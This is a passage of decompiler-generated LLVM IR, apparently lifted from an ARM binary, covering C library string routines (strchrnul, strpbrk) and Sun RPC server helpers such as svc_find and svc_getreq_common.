  %v6_2dc48 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_2dc58 = call i32 @memcpy()
  %v0_2dc5c = load i32, i32* @r5, align 4
  %v1_2dc5c = load i32, i32* @r4, align 4
  %v2_2dc5c = add i32 %v1_2dc5c, %v0_2dc5c
  store i32 %v6_2dc48, i32* @r5, align 4
  ret i32 %v2_2dc5c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_2dc70 = urem i32 %arg1, 256
  %v0_2dc902 = load i32, i32* @r0, align 4
  %v1_2dc903 = urem i32 %v0_2dc902, 4
  %v2_2dc904 = icmp eq i32 %v1_2dc903, 0
  br i1 %v2_2dc904, label %dec_label_pc_2dc98, label %dec_label_pc_2dc78

dec_label_pc_2dc78:                               ; preds = %entry, %dec_label_pc_2dc8c
  %v0_2dc8c = phi i32 [ %v1_2dc8c, %dec_label_pc_2dc8c ], [ %v0_2dc902, %entry ]
  %v1_2dc78 = inttoptr i32 %v0_2dc8c to i8*
  %v2_2dc78 = load i8, i8* %v1_2dc78, align 1
  %v3_2dc78 = zext i8 %v2_2dc78 to i32
  %v9_2dc7c = icmp eq i32 %v3_2dc78, %v1_2dc70
  br i1 %v9_2dc7c, label %dec_label_pc_2dd48, label %dec_label_pc_2dc84

dec_label_pc_2dc84:                               ; preds = %dec_label_pc_2dc78
  %v2_2dc84 = icmp eq i8 %v2_2dc78, 0
  br i1 %v2_2dc84, label %dec_label_pc_2dd48, label %dec_label_pc_2dc8c

dec_label_pc_2dc8c:                               ; preds = %dec_label_pc_2dc84
  %v1_2dc8c = add i32 %v0_2dc8c, 1
  %v1_2dc90 = urem i32 %v1_2dc8c, 4
  %v2_2dc90 = icmp eq i32 %v1_2dc90, 0
  br i1 %v2_2dc90, label %dec_label_pc_2dc98, label %dec_label_pc_2dc78

dec_label_pc_2dc98:                               ; preds = %dec_label_pc_2dc8c, %entry
  %v0_2dc9c = phi i32 [ %v0_2dc902, %entry ], [ %v1_2dc8c, %dec_label_pc_2dc8c ]
  %v4_2dc98 = mul nuw nsw i32 %v1_2dc70, 256
  %v5_2dc98 = or i32 %v4_2dc98, %v1_2dc70
  %v4_2dca0 = mul i32 %v5_2dc98, 65536
  %v5_2dca0 = or i32 %v4_2dca0, %v5_2dc98
  br label %dec_label_pc_2dca4

dec_label_pc_2dca4:                               ; preds = %dec_label_pc_2dd40, %dec_label_pc_2dce0, %dec_label_pc_2dc98
  %v0_2dd08 = phi i32 [ %v0_2dc9c, %dec_label_pc_2dc98 ], [ %v4_2dca4, %dec_label_pc_2dce0 ], [ %v4_2dca4, %dec_label_pc_2dd40 ]
  %v1_2dca4 = inttoptr i32 %v0_2dd08 to i32*
  %v2_2dca4 = load i32, i32* %v1_2dca4, align 4
  %v4_2dca4 = add i32 %v0_2dd08, 4
  %v2_2dcac = xor i32 %v2_2dca4, %v5_2dca0
  %v2_2dcb0 = add i32 %v2_2dcac, 2130640639
  store i32 %v2_2dcb0, i32* @ip, align 4
  %v2_2dcb8 = add i32 %v2_2dca4, 2130640639
  %v1_2dcbc = sub i32 -1, %v2_2dca4
  %v2_2dcc0 = xor i32 %v2_2dcb8, %v1_2dcbc
  %v2_2dccc = and i32 %v2_2dcc0, -2130640640
  %v2_2dcd4 = icmp eq i32 %v2_2dccc, 0
  br i1 %v2_2dcd4, label %dec_label_pc_2dce0, label %dec_label_pc_2dce8

dec_label_pc_2dce0:                               ; preds = %dec_label_pc_2dca4
  %v1_2dcc8 = sub i32 -1, %v2_2dcac
  %v2_2dcd0 = xor i32 %v2_2dcb0, %v1_2dcc8
  %v2_2dcd8 = and i32 %v2_2dcd0, -2130640640
  %v2_2dce0 = icmp eq i32 %v2_2dcd8, 0
  br i1 %v2_2dce0, label %dec_label_pc_2dca4, label %dec_label_pc_2dce8

dec_label_pc_2dce8:                               ; preds = %dec_label_pc_2dca4, %dec_label_pc_2dce0
  %v2_2dce8 = inttoptr i32 %v0_2dd08 to i8*
  %v3_2dce8 = load i8, i8* %v2_2dce8, align 1
  %v4_2dce8 = zext i8 %v3_2dce8 to i32
  %v9_2dcec = icmp eq i32 %v4_2dce8, %v1_2dc70
  br i1 %v9_2dcec, label %dec_label_pc_2dd48, label %dec_label_pc_2dcf8

dec_label_pc_2dcf8:                               ; preds = %dec_label_pc_2dce8
  %v2_2dcf8 = icmp eq i8 %v3_2dce8, 0
  br i1 %v2_2dcf8, label %dec_label_pc_2dd48, label %dec_label_pc_2dd00

dec_label_pc_2dd00:                               ; preds = %dec_label_pc_2dcf8
  %v1_2dd00 = add i32 %v0_2dd08, 1
  %v2_2dd00 = inttoptr i32 %v1_2dd00 to i8*
  %v3_2dd00 = load i8, i8* %v2_2dd00, align 1
  %v4_2dd00 = zext i8 %v3_2dd00 to i32
  %v9_2dd04 = icmp eq i32 %v4_2dd00, %v1_2dc70
  br i1 %v9_2dd04, label %dec_label_pc_2dd48, label %dec_label_pc_2dd10

dec_label_pc_2dd10:                               ; preds = %dec_label_pc_2dd00
  %v2_2dd10 = icmp eq i8 %v3_2dd00, 0
  br i1 %v2_2dd10, label %dec_label_pc_2dd48, label %dec_label_pc_2dd18

dec_label_pc_2dd18:                               ; preds = %dec_label_pc_2dd10
  %v1_2dd18 = add i32 %v0_2dd08, 2
  %v2_2dd18 = inttoptr i32 %v1_2dd18 to i8*
  %v3_2dd18 = load i8, i8* %v2_2dd18, align 1
  %v4_2dd18 = zext i8 %v3_2dd18 to i32
  %v9_2dd1c = icmp eq i32 %v4_2dd18, %v1_2dc70
  br i1 %v9_2dd1c, label %dec_label_pc_2dd48, label %dec_label_pc_2dd28

dec_label_pc_2dd28:                               ; preds = %dec_label_pc_2dd18
  %v2_2dd28 = icmp eq i8 %v3_2dd18, 0
  br i1 %v2_2dd28, label %dec_label_pc_2dd48, label %dec_label_pc_2dd30

dec_label_pc_2dd30:                               ; preds = %dec_label_pc_2dd28
  %v1_2dd30 = add i32 %v0_2dd08, 3
  %v2_2dd30 = inttoptr i32 %v1_2dd30 to i8*
  %v3_2dd30 = load i8, i8* %v2_2dd30, align 1
  %v4_2dd30 = zext i8 %v3_2dd30 to i32
  %v9_2dd34 = icmp eq i32 %v4_2dd30, %v1_2dc70
  br i1 %v9_2dd34, label %dec_label_pc_2dd48, label %dec_label_pc_2dd40

dec_label_pc_2dd40:                               ; preds = %dec_label_pc_2dd30
  %v2_2dd40 = icmp eq i8 %v3_2dd30, 0
  br i1 %v2_2dd40, label %dec_label_pc_2dd48, label %dec_label_pc_2dca4

dec_label_pc_2dd48:                               ; preds = %dec_label_pc_2dc84, %dec_label_pc_2dc78, %dec_label_pc_2dd40, %dec_label_pc_2dd30, %dec_label_pc_2dd28, %dec_label_pc_2dd18, %dec_label_pc_2dd10, %dec_label_pc_2dd00, %dec_label_pc_2dcf8, %dec_label_pc_2dce8
  %v1_2dd4c = phi i32 [ %v1_2dd30, %dec_label_pc_2dd40 ], [ %v1_2dd30, %dec_label_pc_2dd30 ], [ %v1_2dd18, %dec_label_pc_2dd28 ], [ %v1_2dd18, %dec_label_pc_2dd18 ], [ %v1_2dd00, %dec_label_pc_2dd10 ], [ %v1_2dd00, %dec_label_pc_2dd00 ], [ %v0_2dd08, %dec_label_pc_2dcf8 ], [ %v0_2dd08, %dec_label_pc_2dce8 ], [ %v0_2dc8c, %dec_label_pc_2dc78 ], [ %v0_2dc8c, %dec_label_pc_2dc84 ]
  ret i32 %v1_2dd4c

; uselistorder directives
  uselistorder i32 %v4_2dca4, { 1, 0 }
  uselistorder i32 %v2_2dca4, { 0, 2, 1 }
  uselistorder i32 %v0_2dd08, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_2dc98, { 1, 0 }
  uselistorder i32 %v1_2dc8c, { 1, 0, 2 }
  uselistorder i32 %v0_2dc902, { 2, 1, 0 }
  uselistorder i32 %v1_2dc70, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_2dd48, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_2dce8, { 1, 0 }
  uselistorder label %dec_label_pc_2dc78, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2dd84

dec_label_pc_2dd60:                               ; preds = %dec_label_pc_2dd70
  %v3_2dd70 = zext i8 %v2_2dd70 to i32
  %v1_2dd78 = add i32 %v0_2dd78, 1
  %v1_2dd60 = load i32, i32* %r0.global-to-local, align 4
  %v9_2dd60 = icmp eq i32 %v3_2dd70, %v1_2dd60
  br i1 %v9_2dd60, label %dec_label_pc_2dd68, label %dec_label_pc_2dd70

dec_label_pc_2dd68:                               ; preds = %dec_label_pc_2dd60
  %v0_2dd68 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_2dd68, i32* %r0.global-to-local, align 4
  ret i32 %v0_2dd68

dec_label_pc_2dd70:                               ; preds = %dec_label_pc_2dd60, %dec_label_pc_2dd84
  %v0_2dd78 = phi i32 [ %v1_2dd78, %dec_label_pc_2dd60 ], [ %arg2, %dec_label_pc_2dd84 ]
  %v1_2dd70 = inttoptr i32 %v0_2dd78 to i8*
  %v2_2dd70 = load i8, i8* %v1_2dd70, align 1
  %v2_2dd74 = icmp eq i8 %v2_2dd70, 0
  br i1 %v2_2dd74, label %dec_label_pc_2dd80, label %dec_label_pc_2dd60

dec_label_pc_2dd80:                               ; preds = %dec_label_pc_2dd70
  %v0_2dd80 = load i32, i32* %r2.global-to-local, align 4
  %v1_2dd80 = add i32 %v0_2dd80, 1
  br label %dec_label_pc_2dd84

dec_label_pc_2dd84:                               ; preds = %entry, %dec_label_pc_2dd80
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_2dd80, %dec_label_pc_2dd80 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_2dd84 = inttoptr i32 %storemerge to i8*
  %v2_2dd84 = load i8, i8* %v1_2dd84, align 1
  %v3_2dd84 = zext i8 %v2_2dd84 to i32
  store i32 %v3_2dd84, i32* %r0.global-to-local, align 4
  %v2_2dd88 = icmp eq i8 %v2_2dd84, 0
  %v0_2dd8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_2dd88, i32 %v0_2dd8c)
  br label %dec_label_pc_2dd70

; uselistorder directives
  uselistorder i32 %v0_2dd78, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_2dd84, { 1, 0 }
  uselistorder label %dec_label_pc_2dd70, { 1, 0 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_2dddc = add i32 %arg1, 8
  %v2_2dddc = inttoptr i32 %v1_2dddc to i32*
  %v3_2dddc = load i32, i32* %v2_2dddc, align 4
  %v1_2dde4 = add i32 %v3_2dddc, 12
  %v2_2dde4 = inttoptr i32 %v1_2dde4 to i32*
  %v3_2dde4 = load i32, i32* %v2_2dde4, align 4
  call void @__pseudo_branch(i32 %v3_2dde4)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %v1_2de34 = add i32 %arg1, 8
  %v2_2de34 = inttoptr i32 %v1_2de34 to i32*
  %v3_2de34 = load i32, i32* %v2_2de34, align 4
  %v1_2de3c = add i32 %v3_2de34, 12
  %v2_2de3c = inttoptr i32 %v1_2de3c to i32*
  %v3_2de3c = load i32, i32* %v2_2de3c, align 4
  call void @__pseudo_branch(i32 %v3_2de3c)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %v1_2de8c = add i32 %arg1, 8
  %v2_2de8c = inttoptr i32 %v1_2de8c to i32*
  %v3_2de8c = load i32, i32* %v2_2de8c, align 4
  %v1_2de94 = add i32 %v3_2de8c, 12
  %v2_2de94 = inttoptr i32 %v1_2de94 to i32*
  %v3_2de94 = load i32, i32* %v2_2de94, align 4
  call void @__pseudo_branch(i32 %v3_2de94)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_2dee4 = add i32 %arg1, 8
  %v2_2dee4 = inttoptr i32 %v1_2dee4 to i32*
  %v3_2dee4 = load i32, i32* %v2_2dee4, align 4
  %v1_2deec = add i32 %v3_2dee4, 12
  %v2_2deec = inttoptr i32 %v1_2deec to i32*
  %v3_2deec = load i32, i32* %v2_2deec, align 4
  call void @__pseudo_branch(i32 %v3_2deec)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_2df24 = add i32 %arg1, 8
  %v2_2df24 = inttoptr i32 %v1_2df24 to i32*
  %v3_2df24 = load i32, i32* %v2_2df24, align 4
  %v1_2df28 = add i32 %v3_2df24, 12
  %v2_2df28 = inttoptr i32 %v1_2df28 to i32*
  %v3_2df28 = load i32, i32* %v2_2df28, align 4
  call void @__pseudo_branch(i32 %v3_2df28)
  ret i32 %arg1
}

define i32 @svcerr_weakauth() local_unnamed_addr {
entry:
  %v0_2df44 = load i32, i32* @r0, align 4
  %v2_2df44 = call i32 @svcerr_auth(i32 %v0_2df44, i32 5)
  ret i32 %v2_2df44
}

define i32 @__GI_svcerr_noprog(i32 %arg1) local_unnamed_addr {
entry:
  %v1_2df7c = add i32 %arg1, 8
  %v2_2df7c = inttoptr i32 %v1_2df7c to i32*
  %v3_2df7c = load i32, i32* %v2_2df7c, align 4
  %v1_2df84 = add i32 %v3_2df7c, 12
  %v2_2df84 = inttoptr i32 %v1_2df84 to i32*
  %v3_2df84 = load i32, i32* %v2_2df84, align 4
  call void @__pseudo_branch(i32 %v3_2df84)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_progvers(i32 %arg1) local_unnamed_addr {
entry:
  %v1_2dfe4 = add i32 %arg1, 8
  %v2_2dfe4 = inttoptr i32 %v1_2dfe4 to i32*
  %v3_2dfe4 = load i32, i32* %v2_2dfe4, align 4
  %v1_2dfec = add i32 %v3_2dfe4, 12
  %v2_2dfec = inttoptr i32 %v1_2dfec to i32*
  %v3_2dfec = load i32, i32* %v2_2dfec, align 4
  call void @__pseudo_branch(i32 %v3_2dfec)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2e004 = load i32, i32* @r4, align 4
  store i32 %v3_2e004, i32* %stack_var_-16, align 4
  %v6_2e004 = load i32, i32* @r5, align 4
  %v9_2e004 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_2e014 = call i32 @__rpc_thread_variables()
  store i32 %v0_2e014, i32* %r0.global-to-local, align 4
  %v1_2e018 = add i32 %v0_2e014, 184
  %v2_2e018 = inttoptr i32 %v1_2e018 to i32*
  %v3_2e018 = load i32, i32* %v2_2e018, align 4
  store i32 %v3_2e018, i32* %r0.global-to-local, align 4
  %v2_2e0442 = icmp eq i32 %v3_2e018, 0
  br i1 %v2_2e0442, label %dec_label_pc_2e04c, label %dec_label_pc_2e024.lr.ph

dec_label_pc_2e024.lr.ph:                         ; preds = %entry
  %v1_2e028.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2e024

dec_label_pc_2e024:                               ; preds = %dec_label_pc_2e024.lr.ph, %dec_label_pc_2e03c
  %v0_2e04c5 = phi i32 [ 0, %dec_label_pc_2e024.lr.ph ], [ %v0_2e03c, %dec_label_pc_2e03c ]
  %v0_2e03c = phi i32 [ %v3_2e018, %dec_label_pc_2e024.lr.ph ], [ %v2_2e040, %dec_label_pc_2e03c ]
  %v1_2e024 = add i32 %v0_2e03c, 4
  %v2_2e024 = inttoptr i32 %v1_2e024 to i32*
  %v3_2e024 = load i32, i32* %v2_2e024, align 4
  %v9_2e028 = icmp eq i32 %v3_2e024, %v1_2e028.pre
  br i1 %v9_2e028, label %dec_label_pc_2e030, label %dec_label_pc_2e03c

dec_label_pc_2e030:                               ; preds = %dec_label_pc_2e024
  %v1_2e030 = add i32 %v0_2e03c, 8
  %v2_2e030 = inttoptr i32 %v1_2e030 to i32*
  %v3_2e030 = load i32, i32* %v2_2e030, align 4
  %v1_2e034 = load i32, i32* @r4, align 4
  %v9_2e034 = icmp eq i32 %v3_2e030, %v1_2e034
  br i1 %v9_2e034, label %dec_label_pc_2e030.dec_label_pc_2e04c_crit_edge, label %dec_label_pc_2e03c

dec_label_pc_2e03c:                               ; preds = %dec_label_pc_2e024, %dec_label_pc_2e030
  %v1_2e040 = inttoptr i32 %v0_2e03c to i32*
  %v2_2e040 = load i32, i32* %v1_2e040, align 4
  store i32 %v2_2e040, i32* %r0.global-to-local, align 4
  %v2_2e044 = icmp eq i32 %v2_2e040, 0
  br i1 %v2_2e044, label %dec_label_pc_2e044.dec_label_pc_2e04c_crit_edge, label %dec_label_pc_2e024

dec_label_pc_2e044.dec_label_pc_2e04c_crit_edge:  ; preds = %dec_label_pc_2e03c
  br label %dec_label_pc_2e04c

dec_label_pc_2e030.dec_label_pc_2e04c_crit_edge:  ; preds = %dec_label_pc_2e030
  br label %dec_label_pc_2e04c

dec_label_pc_2e04c:                               ; preds = %dec_label_pc_2e030.dec_label_pc_2e04c_crit_edge, %dec_label_pc_2e044.dec_label_pc_2e04c_crit_edge, %entry
  %v0_2e04c = phi i32 [ %v0_2e04c5, %dec_label_pc_2e030.dec_label_pc_2e04c_crit_edge ], [ %v0_2e03c, %dec_label_pc_2e044.dec_label_pc_2e04c_crit_edge ], [ 0, %entry ]
  %v1_2e04c = load i32, i32* @r5, align 4
  %v2_2e04c = inttoptr i32 %v1_2e04c to i32*
  store i32 %v0_2e04c, i32* %v2_2e04c, align 4
  %v2_2e050 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2e050, i32* @r4, align 4
  store i32 %v6_2e004, i32* @r5, align 4
  store i32 %v9_2e004, i32* @r6, align 4
  %v1_2e054 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2e054

; uselistorder directives
  uselistorder i32 %v2_2e040, { 1, 2, 0 }
  uselistorder i32 %v0_2e03c, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_2e03c, { 1, 0 }
  uselistorder label %dec_label_pc_2e024, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-520 = alloca i32, align 4
  %stack_var_-1320 = alloca i32, align 4
  %stack_var_-1328 = alloca i32, align 4
  %v3_2e058 = load i32, i32* @r4, align 4
  %v6_2e058 = load i32, i32* @r5, align 4
  %v27_2e058 = load i32, i32* @lr, align 4
  %v2_2e064 = ptrtoint i32* %stack_var_-1320 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_2e078 = call i32 @__rpc_thread_variables()
  store i32 %v0_2e078, i32* %r0.global-to-local, align 4
  %v1_2e07c = add i32 %v0_2e078, 180
  %v2_2e07c = inttoptr i32 %v1_2e07c to i32*
  %v3_2e07c = load i32, i32* %v2_2e07c, align 4
  %v1_2e080 = load i32, i32* @r4, align 4
  %v4_2e080 = mul i32 %v1_2e080, 4
  %v5_2e080 = add i32 %v4_2e080, %v3_2e07c
  %v6_2e080 = inttoptr i32 %v5_2e080 to i32*
  %v7_2e080 = load i32, i32* %v6_2e080, align 4
  store i32 %v7_2e080, i32* @r4, align 4
  %v2_2e088 = icmp eq i32 %v7_2e080, 0
  store i32 %v0_2e078, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  br i1 %v2_2e088, label %dec_label_pc_2e228, label %dec_label_pc_2e098

dec_label_pc_2e098:                               ; preds = %entry
  %v2_2e09c = ptrtoint i32* %stack_var_-520 to i32
  store i32 240, i32* %stack_var_-1328, align 4
  %v2_2e0b0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 1, i32* %sb.global-to-local, align 4
  %v2_2e0c0 = ptrtoint i32* %stack_var_-72 to i32
  br label %dec_label_pc_2e0c4

dec_label_pc_2e0c4:                               ; preds = %dec_label_pc_2e220.dec_label_pc_2e0c4_crit_edge, %dec_label_pc_2e098
  %v0_2e0c4 = phi i32 [ %v0_2e0c4.pre, %dec_label_pc_2e220.dec_label_pc_2e0c4_crit_edge ], [ %v7_2e080, %dec_label_pc_2e098 ]
  %v1_2e0c4 = add i32 %v0_2e0c4, 8
  %v2_2e0c4 = inttoptr i32 %v1_2e0c4 to i32*
  %v3_2e0c4 = load i32, i32* %v2_2e0c4, align 4
  store i32 %v0_2e0c4, i32* %r0.global-to-local, align 4
  %v1_2e0d0 = inttoptr i32 %v3_2e0c4 to i32*
  %v2_2e0d0 = load i32, i32* %v1_2e0d0, align 4
  store i32 %v2_2e0d0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_2e0d0)
  %v0_2e0dc = load i32, i32* %r0.global-to-local, align 4
  %v2_2e0dc = icmp eq i32 %v0_2e0dc, 0
  br i1 %v2_2e0dc, label %dec_label_pc_2e1ec, label %dec_label_pc_2e0e4

dec_label_pc_2e0e4:                               ; preds = %dec_label_pc_2e0c4
  %v2_2e0e4 = load i32, i32* %stack_var_-96, align 4
  store i32 %v2_2e0e4, i32* %r0.global-to-local, align 4
  store i32 %tmp25, i32* %stack_var_-72, align 4
  store i32 %v2_2e0e4, i32* %ip.global-to-local, align 4
  %v2_2e108 = icmp eq i32 %v2_2e0e4, 0
  %v0_2e114 = load i32, i32* @r4, align 4
  br i1 %v2_2e108, label %dec_label_pc_2e11c, label %dec_label_pc_2e138

dec_label_pc_2e11c:                               ; preds = %dec_label_pc_2e0e4
  %v2_2e11c = load i32, i32* %stack_var_-1328, align 4
  %v0_2e120 = load i32, i32* @r5, align 4
  %v2_2e120 = add i32 %v0_2e120, %v2_2e11c
  %v3_2e120 = inttoptr i32 %v2_2e120 to i32*
  %v4_2e120 = load i32, i32* %v3_2e120, align 4
  %v1_2e124 = inttoptr i32 %v4_2e120 to i32*
  %v2_2e124 = load i32, i32* %v1_2e124, align 4
  %v2_2e128 = add i32 %v0_2e114, 32
  %v3_2e128 = inttoptr i32 %v2_2e128 to i32*
  store i32 %v2_2e124, i32* %v3_2e128, align 4
  %v0_2e130 = load i32, i32* %ip.global-to-local, align 4
  %v2_2e130 = add i32 %v0_2e114, 40
  %v3_2e130 = inttoptr i32 %v2_2e130 to i32*
  store i32 %v0_2e130, i32* %v3_2e130, align 4
  br label %dec_label_pc_2e15c

dec_label_pc_2e138:                               ; preds = %dec_label_pc_2e0e4
  store i32 %v2_2e0c0, i32* %r0.global-to-local, align 4
  %v12_2e140 = call i32 @_authenticate(i32 %v2_2e0c0, i32 %v2_2e0b0, i32 %v2_2e09c, i32 %tmp20, i32 %tmp25, i32 %tmp22, i32 %tmp20, i32 %v2_2e0e4, i32 %v2_2e064, i32 %tmp26, i32 %v2_2e09c, i32 %v0_2e114)
  store i32 %v12_2e140, i32* %r0.global-to-local, align 4
  %v2_2e144 = icmp eq i32 %v12_2e140, 0
  br i1 %v2_2e144, label %dec_label_pc_2e15c, label %dec_label_pc_2e14c

dec_label_pc_2e14c:                               ; preds = %dec_label_pc_2e138
  %v0_2e150 = load i32, i32* @r4, align 4
  store i32 %v0_2e150, i32* %r0.global-to-local, align 4
  %v2_2e154 = call i32 @svcerr_auth(i32 %v0_2e150, i32 %v12_2e140)
  store i32 %v2_2e154, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e1ec

dec_label_pc_2e15c:                               ; preds = %dec_label_pc_2e138, %dec_label_pc_2e11c
  %v0_2e160 = load i32, i32* %r8.global-to-local, align 4
  %v1_2e160 = add i32 %v0_2e160, 184
  %v2_2e160 = inttoptr i32 %v1_2e160 to i32*
  %v3_2e160 = load i32, i32* %v2_2e160, align 4
  store i32 %v3_2e160, i32* %ip.global-to-local, align 4
  store i32 -1, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_2e1c42 = icmp eq i32 %v3_2e160, 0
  br i1 %v2_2e1c42, label %dec_label_pc_2e1cc.thread, label %dec_label_pc_2e170.lr.ph

dec_label_pc_2e1cc.thread:                        ; preds = %dec_label_pc_2e15c
  br label %dec_label_pc_2e1e4

dec_label_pc_2e170.lr.ph:                         ; preds = %dec_label_pc_2e15c
  %v3_2e174.pre = load i32, i32* %stack_var_-72, align 4
  br label %dec_label_pc_2e170

dec_label_pc_2e170:                               ; preds = %dec_label_pc_2e170.lr.ph, %dec_label_pc_2e1c4
  %v0_2e1cc13 = phi i32 [ 0, %dec_label_pc_2e170.lr.ph ], [ %v0_2e1cc12, %dec_label_pc_2e1c4 ]
  %v1_2e1b4 = phi i32 [ 0, %dec_label_pc_2e170.lr.ph ], [ %v1_2e1b410, %dec_label_pc_2e1c4 ]
  %v0_2e1ac = phi i32 [ -1, %dec_label_pc_2e170.lr.ph ], [ %v0_2e1ac7, %dec_label_pc_2e1c4 ]
  %v0_2e19c = phi i32 [ %v3_2e160, %dec_label_pc_2e170.lr.ph ], [ %v2_2e1c0, %dec_label_pc_2e1c4 ]
  %v1_2e170 = add i32 %v0_2e19c, 4
  %v2_2e170 = inttoptr i32 %v1_2e170 to i32*
  %v3_2e170 = load i32, i32* %v2_2e170, align 4
  %v9_2e178 = icmp eq i32 %v3_2e170, %v3_2e174.pre
  br i1 %v9_2e178, label %dec_label_pc_2e180, label %dec_label_pc_2e1c4

dec_label_pc_2e180:                               ; preds = %dec_label_pc_2e170
  %v1_2e180 = add i32 %v0_2e19c, 8
  %v2_2e180 = inttoptr i32 %v1_2e180 to i32*
  %v3_2e180 = load i32, i32* %v2_2e180, align 4
  %v9_2e188 = icmp eq i32 %v3_2e180, %tmp22
  %v0_2e18c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_2e18c, i32* %r0.global-to-local, align 4
  br i1 %v9_2e188, label %dec_label_pc_2e194, label %dec_label_pc_2e1ac

dec_label_pc_2e194:                               ; preds = %dec_label_pc_2e180
  store i32 %v2_2e0c0, i32* %r0.global-to-local, align 4
  %v1_2e19c = add i32 %v0_2e19c, 12
  %v2_2e19c = inttoptr i32 %v1_2e19c to i32*
  %v3_2e19c = load i32, i32* %v2_2e19c, align 4
  store i32 %v3_2e19c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_2e19c)
  br label %dec_label_pc_2e1ec

dec_label_pc_2e1ac:                               ; preds = %dec_label_pc_2e180
  %v3_2e1ac = icmp ult i32 %v0_2e1ac, %v3_2e180
  br i1 %v3_2e1ac, label %bb52, label %bb

bb:                                               ; preds = %dec_label_pc_2e1ac
  store i32 %v3_2e180, i32* @r1, align 4
  br label %bb52

bb52:                                             ; preds = %dec_label_pc_2e1ac, %bb
  %v0_2e1ac8 = phi i32 [ %v0_2e1ac, %dec_label_pc_2e1ac ], [ %v3_2e180, %bb ]
  %v3_2e1b4 = icmp uge i32 %v3_2e180, %v1_2e1b4
  %v9_2e1b4 = icmp eq i32 %v3_2e180, %v1_2e1b4
  %v2_2e1b8 = xor i1 %v9_2e1b4, true
  %v3_2e1b8 = and i1 %v3_2e1b4, %v2_2e1b8
  br i1 %v3_2e1b8, label %bb53, label %bb54

bb53:                                             ; preds = %bb52
  br label %bb54

bb54:                                             ; preds = %bb52, %bb53
  %v1_2e1b411 = phi i32 [ %v1_2e1b4, %bb52 ], [ %v3_2e180, %bb53 ]
  %v2_2e1bc = xor i1 %v3_2e1b4, true
  %v3_2e1bc = or i1 %v9_2e1b4, %v2_2e1bc
  br i1 %v3_2e1bc, label %bb55, label %dec_label_pc_2e1c4

bb55:                                             ; preds = %bb54
  store i32 %v0_2e18c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e1c4

dec_label_pc_2e1c4:                               ; preds = %dec_label_pc_2e170, %bb54, %bb55
